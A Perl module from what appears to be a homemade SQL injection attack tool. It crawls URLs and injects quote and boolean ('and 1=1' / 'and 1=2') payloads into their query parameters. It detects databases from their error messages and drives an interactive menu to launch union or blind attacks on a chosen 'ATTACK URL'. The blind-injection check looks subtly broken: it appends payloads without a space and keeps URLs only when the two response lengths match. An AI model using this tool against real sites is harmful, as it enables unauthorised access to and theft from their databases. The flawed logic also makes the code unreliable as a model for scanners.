#!/usr/bin/perl
use warnings;
use strict;
use 5.010;

require 'sql_union.pl';
require 'sql_blind.pl';

sub sql_scan
{
    my ($crawl, %crawl_urls) = @_;

    for my $url (keys %crawl_urls)
    {
        my $uri = URI->new($url);
        my $query = $uri->query;
        next if $query;
        delete $crawl_urls{$url};
    }
    my %blind_urls = %crawl_urls;
    my %union_urls = %crawl_urls;

    for my $url(keys %union_urls) #sql weak point
    {
        my $abs_url = $url;
        $abs_url =~ s/=/='TEST/g;

        eval{ $crawl->get($abs_url) };
        my $response = $crawl->response;
        my $content = $response->decoded_content;
        if($content =~ /(Microsoft SQL|MySQL|ORA)/i)
        {
            $union_urls{$url} = $1;
            say $url;
        }
        else
        {
            delete $union_urls{$url};
        }
    }

    for my $url(keys %blind_urls)
    {
        my $response=eval{$crawl->get($url."and 1=1")};
        my $header=$crawl->response->headers;
        my $origin_con_len1 = ${$header}{'content-length'}||"";
        $origin_con_len1=length($response->decoded_content()) if $origin_con_len1 eq "";

        $response=eval{$crawl->get($url."and 1=2")};
        $header=$crawl->response->headers;
        my $origin_con_len2 = ${$header}{'content-length'}||"";
        $origin_con_len2=length($response->decoded_content()) if $origin_con_len2 eq "";

        delete $blind_urls{$url} unless $origin_con_len1==$origin_con_len2;
    }
    while(1)
    {
        say "--------SQL_UNION_SCAN-------";
        say for sort keys %union_urls;
        say "--------SQL_BLIND_SCAN-------";
        say for sort keys %blind_urls;

        print ">";
        chomp(my $option = <STDIN>);
        if($option eq 'q')
        {
            last;
        }
        elsif($option eq 'v')
        {
            next;
        }
        elsif($option eq 'u')
        {
            print "INPUT ATTACK URL : ";
            chomp(my $url = <STDIN>);
            next unless exists $union_urls{$url};
            sql_union($crawl, $url, \%union_urls);
        }
        elsif($option eq 'b')
        {
            print "INPUT ATTACK URL : ";
            chomp(my $url = <STDIN>);
            next unless exists $blind_urls{$url};
            blind_attack($url);
        }
        else
        {
            next;
        }
    }
}
1;    
